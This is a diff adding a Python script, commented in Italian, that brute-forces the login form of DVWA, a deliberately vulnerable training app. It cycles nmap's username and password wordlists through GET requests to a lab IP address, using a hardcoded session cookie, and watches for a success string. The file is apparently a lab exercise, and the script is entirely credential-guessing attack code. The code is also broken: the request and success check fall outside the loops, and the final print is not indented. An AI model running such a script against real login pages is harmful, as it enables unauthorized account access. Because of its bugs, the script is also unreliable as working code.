@@ -1,0 +1,67 @@
+#Brute force con metodo GET
+
+import http.client, urllib.parse #Importa i moduli http.client e urllib.parse necessari per la gestione delle richieste HTTP e la codifica dei parametri
+
+#user = "admin"
+#pwd = "password"
+
+base_url = ("/dvwa/vulnerabilities/brute/") #Questa variabile contiene la parte fissa dell'URL a cui saranno aggiunti dinamicamente i parametri della richiesta
+
+#password=("password=",pwd)
+#login= ("Login=","Login#")
+
+#Apre e legge i file contenenti le liste di nomi utente e password
+
+user_list = open('/usr/share/nmap/nselib/data/usernames.lst')
+pwd_list = open('/usr/share/nmap/nselib/data/passwords.lst')
+
+#I comandi readlines() convertono il contenuto dei file in liste, dove ogni elemento rappresenta una riga del file
+
+user_list = user_list.readlines()
+pwd_list = pwd_list.readlines()
+
+#Questo codice esegue un doppio ciclo for annidato per combinare ogni nome utente con ogni password
+#Utilizza urllib.parse.urlencode() per codificare i parametri del form di login (username e password) in un formato appropriato per l'invio tramite richiesta HTTP GET 
+#Viene quindi creato un URL finale (urlf) combinando la base URL (base_url) con i parametri codificati
+
+for user in user_list:
+	user = user.rstrip()
+	#comando di controllo per verificare la corretta lettura dei nomi(lasciato come commento)
+	#print(user)
+	#ciclo for annidato per inserire ogni password ai relativi username
+	for pwd in pwd_list:
+		pwd = pwd.rstrip()
+		url = urllib.parse.urlencode({'username':user, 'password':pwd,'Login':"Login#"})
+		urle = ''
+		urle += '?' + url
+		urlf = ''.join(base_url+ urle)
+		#urlg = ''
+		#urlg += '?' + urlf
+		#print('URL finale ',urlf)
+		#print('url finaleg ',urlg)
+		
+#Viene creato un dizionario headers contenente gli header necessari per la richiesta HTTP GET. In particolare, c'è un header Cookie con un valore di sessione PHPSESSID	
+
+headers = {"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml",'Cookie':f'PHPSESSID={"687232e19a3ea1541f40b4e21a5aa43d"}'}
+		
+#Crea una connessione HTTP (HTTPConnection) al server target con l'indirizzo IP '192.168.50.101' sulla porta 80
+
+conn = http.client.HTTPConnection('192.168.50.101',80)
+
+#Invia una richiesta HTTP GET all'URL finale (urlf) con i parametri e gli header specificati
+
+conn.request("GET",urlf,url ,headers)
+
+#Riceve la risposta dal server
+
+response = conn.getresponse()
+
+#Legge la risposta del server e la decodifica.
+
+data = response.read().decode()
+
+#Se la stringa "Welcome to the password" è presente nella risposta, stampa un messaggio che indica che l'accesso è stato effettuato con successo utilizzando la coppia di credenziali corrente
+
+if "Welcome to the password" in str(data):
+
+print("logged with", user,"-",pwd)
